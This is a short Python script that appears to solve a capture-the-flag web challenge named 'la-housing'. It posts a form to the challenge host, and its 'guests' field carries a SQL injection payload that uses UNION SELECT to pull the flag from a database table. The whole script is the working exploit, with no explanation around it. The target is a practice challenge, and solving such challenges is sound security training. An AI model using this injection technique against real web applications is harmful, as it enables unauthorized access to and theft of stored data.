import requests

print(
	requests.post(
	"https://la-housing.chall.lac.tf/submit",
	data={
	"name": "blah",
	"guests": "' union select 1,flag,1,1,1,1 from flag where '1"
	}
	).text
)
